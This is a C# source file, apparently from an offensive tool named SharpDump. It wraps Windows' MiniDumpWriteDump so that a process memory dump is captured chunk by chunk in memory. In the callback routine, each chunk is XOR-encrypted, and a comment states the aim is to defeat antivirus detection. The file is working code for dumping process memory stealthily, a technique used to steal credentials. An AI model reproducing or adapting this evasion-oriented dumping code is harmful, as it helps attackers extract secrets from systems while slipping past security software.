using System;
using System.Runtime.InteropServices;

namespace SharpDump
{
    class MiniDump
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct MINIDUMP_IO_CALLBACK
        {
            public IntPtr Handle;
            public ulong Offset;
            public IntPtr Buffer;
            public uint BufferBytes;
        }

        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct MINIDUMP_CALLBACK_UNION
        {
            [FieldOffset(0)]
            public MINIDUMP_IO_CALLBACK Io;

            [FieldOffset(0)]
            public fixed byte Padding[1296];
        }

        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct MINIDUMP_CALLBACK_INPUT
        {
            [FieldOffset(0)]
            public uint ProcessId;

            [FieldOffset(4)]
            public IntPtr ProcessHandle;

            [FieldOffset(12)]
            public MINIDUMP_CALLBACK_TYPE CallbackType;

            [FieldOffset(16)]
            public MINIDUMP_CALLBACK_UNION Union;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MINIDUMP_CALLBACK_OUTPUT
        {
            public HRESULT Status;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MINIDUMP_CALLBACK_INFORMATION
        {
            public MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
            public IntPtr CallbackParam;
        }

        [Flags]
        public enum MINIDUMP_TYPE : uint
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000,
            MiniDumpWithoutAuxiliaryState = 0x00004000,
            MiniDumpWithFullAuxiliaryState = 0x00008000,
            MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
            MiniDumpIgnoreInaccessibleMemory = 0x00020000,
            MiniDumpWithTokenInformation = 0x00040000,
            MiniDumpValidTypeFlags = 0x0007ffff
        }

        [Flags]
        public enum MINIDUMP_CALLBACK_TYPE : uint
        {
            ModuleCallback = 0,
            ThreadCallback = 1,
            ThreadExCallback = 2,
            IncludeThreadCallback = 3,
            IncludeModuleCallback = 4,
            MemoryCallback = 5,
            CancelCallback = 6,
            WriteKernelMinidumpCallback = 7,
            KernelMinidumpStatusCallback = 8,
            RemoveMemoryCallback = 9,
            IncludeVmRegionCallback = 10,
            IoStartCallback = 11,
            IoWriteAllCallback = 12,
            IoFinishCallback = 13,
            ReadMemoryFailureCallback = 14,
            SecondaryFlagsCallback = 15
        }

        [Flags]
        public enum HRESULT : uint
        {
            S_OK = 0,
            S_FALSE = 1
        }

        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/
        [DllImport(
            "dbghelp.dll",
            EntryPoint = "MiniDumpWriteDump",
            CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode,
            ExactSpelling = true,
            SetLastError = true)]
        public static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            MINIDUMP_CALLBACK_INFORMATION CallbackParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public unsafe delegate bool MINIDUMP_CALLBACK_ROUTINE(
            IntPtr CallbackParam,
            MINIDUMP_CALLBACK_INPUT* CallbackInput,
            MINIDUMP_CALLBACK_OUTPUT* CallbackOutput);

        public unsafe static bool Callback(
            IntPtr CallbackParam,
            MINIDUMP_CALLBACK_INPUT* CallbackInput,
            MINIDUMP_CALLBACK_OUTPUT* CallbackOutput)
        {
            switch (CallbackInput->CallbackType)
            {
                case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                    CallbackOutput->Status = HRESULT.S_FALSE;
                    break;

                case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                    CallbackOutput->Status = HRESULT.S_OK;

                    uint len = CallbackInput->Union.Io.BufferBytes;
                    IntPtr destination = Marshal.AllocHGlobal((int)len);

                    // copy the current chunk
                    Buffer.MemoryCopy((byte*)CallbackInput->Union.Io.Buffer, (byte*)destination, len, len);

                    /*
                     * We can do an extra transformation at this stage, like XOR-encrypt
                     * the MiniDump before compressing it and writing it to disk.
                     * This can be useful if gzip compression alone turns out to be
                     * useless against AV.
                     *
                     * Example:
                    */
                    for (int i = 0; i < len; i++)
                        ((byte*)destination)[i] ^= 42;

                    Globals.Chunks.Add((destination, (int)len, (int)CallbackInput->Union.Io.Offset));
                    break;

                case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                    CallbackOutput->Status = HRESULT.S_OK;
                    break;

                default:
                    break;
            }
            return true;
        }
    }
}
